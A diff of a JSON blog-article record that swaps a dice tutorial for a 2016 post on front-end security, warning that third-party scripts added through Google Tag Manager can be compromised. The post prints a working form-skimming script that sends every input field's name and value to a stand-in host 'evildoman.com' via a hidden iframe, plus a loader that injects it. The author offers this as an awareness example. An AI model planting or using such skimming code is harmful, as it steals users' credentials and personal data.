@@ -1,45 +1,40 @@
 {
   "type_of": "article",
   "id": "wp-657",
-  "title": "SVG, pair of dice",
-  "description": "Tutorial on creating interactive SVG dice with JavaScript-controlled animations and pseudo-3D effects using CSS gradients.",
-  "slug": "svg-pair-of-dice",
-  "url": "https://madsstoumann.wordpress.com/2016/07/08/svg-pair-of-dice/",
-  "path": "/svg-pair-of-dice",
-  "canonical_url": "https://madsstoumann.wordpress.com/2016/07/08/svg-pair-of-dice/",
-  "cover_image": null,
-  "social_image": null,
-  "body_html": "<p>By <a href=\"https://plus.google.com/+MadsStoumannDK?rel=author\">Mads Stoumann</a></p>\n<p>Last week I got my hands on a simple dice game: Yatzy.</p>\n<p>I like to play around with SVG and animations, so I thought I&#8217;d create a digital version of the game using CSS (SCSS) for the pseudo-3D-look of the dice, and JavaScript for controlling the throw.</p>\n<p>In this version, clicking on a die will &#8220;lock&#8221; it, so that the next throw won&#8217;t change that die. The locked die will have a red shadow.</p>\n<p>Clicking &#8220;Roll&#8221; will throw all unlocked dice.</p>\n<p>By the way, I&#8217;ve used an old-school random-snippet (I thought I&#8217;d share it!):</p>\n<pre class=\"brush: jscript; title: ; notranslate\" title=\"\">\nfunction getRandom(nMin, nMax) {\n  return ~~(Math.random() * (nMax - nMin + 1)) + nMin;\n}\n</pre>\n<p>Enjoy!</p>\n<div class=\"embed-codepen\"><iframe title=\"SVG Dice\" id=\"cp_embed_RRYxLV\" src=\"https://codepen.io/stoumann/embed/preview/RRYxLV?default-tabs=result&amp;height=300&amp;host=https%3A%2F%2Fcodepen.io&amp;slug-hash=RRYxLV\" scrolling=\"no\" frameborder=\"0\" height=\"300\" allowtransparency=\"true\" allowfullscreen=\"true\" allowpaymentrequest=\"true\" class=\"cp_embed_iframe\" style=\"width: 100%; overflow: hidden;\"></iframe></div>\n<p>Happy coding!</p>",
+  "title": "Front-End Security",
+  "description": "I recently read this blog-post by Yapni Berhanu, about the dangers of 3rd-party scripts &mdash; something we include in tools like Google Tag Manager without blinking twice. This sentence in particula",
+  "slug": "front-end-security",
+  "url": "https://madsstoumann.wordpress.com/2016/08/01/front-end-security/",
+  "path": "/front-end-security",
+  "canonical_url": "https://madsstoumann.wordpress.com/2016/08/01/front-end-security/",
+  "cover_image": "assets/generic_cover.jpg",
+  "social_image": "assets/generic_cover.jpg",
+  "body_html": "<p>I recently read <a href=\"https://css-tricks.com/potential-dangers-of-third-party-javascript/\" target=\"_blank\">this blog-post</a> by Yapni Berhanu, about the dangers of 3rd-party scripts &mdash; something we include in tools like <em>Google Tag Manager</em> without blinking twice. This sentence in particular grabbed my attention:</p>\n<blockquote><p>Any time you include someone else&#8217;s external script on your page, there&#8217;s an inherent security risk because that script has full access to the front end of your site.</p></blockquote>\n<p>The potential security-problems might not be with your trusted vendors, but what if <em>they</em> get hacked, and inject malicious code?</p>\n<p>I&#8217;m not a hacker, so this might not be the most sophisticated example, but it&#8217;s an example of a script that:</p>\n<ol>\n<li>Adds an event-listener to all input-elements.</li>\n<li>When the user leaves an input-field, it creates an iframe with the input-fields&#8217; details added to the hash-fragment or querystring-part of the src of the iframe.</li>\n<li>After 250 milliseconds, the iframe is deleted, that should be sufficient time for the details to be grabbed and proccesed.</li>\n</ol>\n<pre class=\"brush: jscript; title: ; notranslate\" title=\"\">\r\n(function(url){\r\n\tvar d=document,i=d.querySelectorAll(&quot;input&quot;),l=location,n=i.length;\r\n\twhile(n--)i[n].addEventListener(&quot;blur&quot;,H,false);\r\n\tfunction H(){\r\n\t\tif (this.value){\r\n\t\t\tvar F=d.createElement(&quot;iframe&quot;),T;\r\n\t  \t\tF.width=0;F.height=0;F.src=l.protocol+&quot;//&quot;+url+l.host+&quot;?&quot;+this[&quot;name&quot;]+&quot;=&quot;+this.value;\r\n\t    \td.body.appendChild(F);\r\n\t    \tT= window.setTimeout(function(){d.body.removeChild(F);},250);\r\n    \t}\r\n\t}\r\n})(&quot;evildoman.com/#&quot;);\r\n</pre>\n<p>You can include the script from an innocent-looking script in <em>Google Tag Manager</em>, this is, typically, what an external tracking-script implementation would look like in a <em>Custom HTML tag</em>:</p>\n<pre class=\"brush: jscript; title: ; notranslate\" title=\"\">\r\n&lt;script&gt;\r\n(function(d,s){\r\n\th=d.getElementsByTagName(&quot;head&quot;)[0];\r\n\to=d.createElement(&quot;script&quot;);\r\n\to.async=1;\r\n\to.src=s;\r\n\th.appendChild(r);\r\n})(document,&quot;//nicedomain.com/tracking.js&quot;);\r\n&lt;/script&gt;\r\n</pre>\n<p>&mdash; and <em>voila!</em>, the nice-domain-script loads the evil-domain-script, and all form fields on the page will create an iframe and post the field&#8217;s <em>value</em> and <em>name</em> in the <em>src</em> of the frame.</p>\n<p>I added a <em>snippet</em> in Dev Tools, and tried to trigger this code on Amazon and Facebook.<br />\nThis is a &#8220;thought&#8221; example, since none of these would allow 3rd-party-scripts on their login-page, but I noticed a small difference:</p>\n<p>Facebook fired an XHR-post every time I leaved an input field &mdash; my guess is they&#8217;re using a <a href=\"https://developer.mozilla.org/en/docs/Web/API/MutationObserver\" target=\"_blank\">MutationObserver</a>, code that is called whenever something in the DOM changes, but can&#8217;t this be overwritten by a 3rd-party-script as well?</p>\n<p>And would it make sense to track all &#8220;outgoing&#8221; traffic by <a href=\"http://stackoverflow.com/questions/5202296/add-a-hook-to-all-ajax-requests-on-a-page\" target=\"_blank\">having an XHR Listener</a>?</p>\n<p>I don&#8217;t know, but should I? This leads to the next question:</p>\n<h2>Who has the front-end security responsibility?</h2>\n<ol>\n<li>Is it the front-end developer&#8217;s responsibility to safe-guard the JavaScript from (present and future) attacks?</li>\n<li>Is it the digital agency who&#8217;re adding 3rd-party-scripts from a tool like <em>Google Tag Manager?</em></li>\n<li>Is it the marketeer requesting a 3rd-party-script to be added?</li>\n</ol>\n<p>I would argue there&#8217;s enough on the front-end developers plate already (a new, hot, must-use framework coming out every week!), and since I predict there will not be <em>less</em> hacking attempts in the future, who really <em>has</em> the security responsibility here?</p>\n<p>Yapni Berhanu concludes his blog-post with this (excerpts):</p>\n<blockquote><p>Do you only allow sources you highly trust?<br />\nDo you vet the code yourself by reading it or watching DevTools closely?</p></blockquote>\n<p>&mdash; which suggest, it&#8217;s either the webmaster or the front-end developer&#8217;s responsibility.<br />\nI guess that is up for discussion, but until then, it might be a good idea to <em>remove</em> 3rd-party-scripts from pages, where users enter data.</p>\n<p>In <em>Google Tag Manager</em> one can add exception-triggers, so the 3rd-part-scripts are only loaded on the correct URL&#8217;s.</p>\n<p>But then: what about forms in overlays? They don&#8217;t have a unique URL for the exception-trigger.</p>\n<p>And then, <a href=\"https://www.hackthis.co.uk/articles/practical-applications-of-cross-site-scripting-xss\" target=\"_blank\">there&#8217;s XSS</a> &hellip;</p>\n",
   "body_markdown": null,
-  "reading_time_minutes": 1,
-  "published_at": "2016-07-08T11:35:27+02:00",
-  "published_timestamp": "2016-07-08T11:35:27+02:00",
-  "created_at": "2016-07-08T11:35:27+02:00",
+  "reading_time_minutes": 4,
+  "published_at": "2016-08-01T10:06:18+02:00",
+  "published_timestamp": "2016-08-01T10:06:18+02:00",
+  "created_at": "2016-08-01T10:06:18+02:00",
   "edited_at": null,
   "last_comment_at": null,
-  "comments_count": 0,
+  "comments_count": 1,
   "public_reactions_count": 0,
   "positive_reactions_count": 0,
-  "tag_list": "javascript, svg",
+  "tag_list": "google-tag-manager, javascript, security",
   "tags": [
-    {
-      "id": "javascript",
-      "name": "javascript"
-    },
-    {
-      "id": "svg",
-      "name": "svg"
-    }
+    "google-tag-manager",
+    "javascript",
+    "security"
   ],
   "language": "en",
   "source": "wordpress",
   "source_site": "madsstoumann.wordpress.com",
-  "readable_publish_date": "Jul 8 '16",
+  "readable_publish_date": "Aug 1 ' 16",
   "user": {
     "name": "Mads Stoumann",
     "username": "madsstoumann",
-    "user_id": 1,
-    "profile_image": null,
-    "profile_image_90": null
+    "user_id": 9869553,
+    "profile_image": "https://1.gravatar.com/avatar/aaf3a0f078105d79d3e696d871bb763f3cbb3a5300ae4fd652e24f1b1261fc3a?s=96&d=identicon&r=G",
+    "profile_image_90": "https://1.gravatar.com/avatar/aaf3a0f078105d79d3e696d871bb763f3cbb3a5300ae4fd652e24f1b1261fc3a?s=96&d=identicon&r=G"
   }
 }
